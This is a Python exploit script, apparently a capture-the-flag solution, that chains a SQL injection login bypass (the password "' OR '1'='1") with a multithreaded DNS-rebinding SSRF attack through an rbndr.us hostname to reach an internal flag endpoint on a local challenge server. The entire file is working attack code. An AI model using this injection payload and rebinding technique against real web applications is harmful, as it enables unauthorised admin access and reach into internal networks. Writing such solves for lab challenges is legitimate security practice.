"""
1. SQLi auth bypass to get admin access
2. Login as admin to access URL scanner
3. Use DNS rebinding to bypass SSRF protection and access internal service
"""

import requests
import time
import threading

BASE_URL = 'http://localhost:31004'
REBINDER_URL = 'http://08080808.7f000001.rbndr.us:5000/flag'



def ssrf_rebind(max_time=60):
    session = requests.Session()
    resp = session.post(BASE_URL + '/login', data={'username': 'admin', 'password': "' OR '1'='1"})
    if 'dashboard' not in resp.url and 'Dashboard' not in resp.text:
        return None

    result = {'flag': None}
    end = time.time() + max_time
    
    def worker():
        while time.time() < end and not result['flag']:
            try:
                r = session.post(BASE_URL + '/dashboard', data={'target_url': REBINDER_URL}, timeout=10)
                if 'grey{' in r.text.lower():
                    result['flag'] = r.text
                    return
            except Exception:
                pass
            time.sleep(0.05)
    
    threads = [threading.Thread(target=worker) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=max_time)
    
    return result['flag']


if __name__ == '__main__':
    flag = ssrf_rebind()
    if flag:
        print(flag)
